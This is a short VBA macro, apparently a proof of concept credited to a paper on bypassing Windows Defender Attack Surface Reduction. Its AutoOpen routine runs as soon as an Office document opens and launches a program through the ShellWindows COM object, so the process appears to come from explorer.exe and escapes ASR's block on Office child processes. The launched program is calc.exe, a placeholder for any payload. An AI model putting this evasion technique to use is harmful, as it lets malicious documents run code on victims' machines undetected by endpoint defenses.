' Credit to: http://blog.sevagas.com/IMG/pdf/bypass_windows_defender_attack_surface_reduction.pdf
' Parent process is explorer.exe
Sub AutoOpen()
'Get Object
Set ShellWindows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
Set itemObj = ShellWindows.Item()
itemObj.Document.Application.ShellExecute "C:\windows\system32\calc.exe", "", "", "open", 1
End Sub
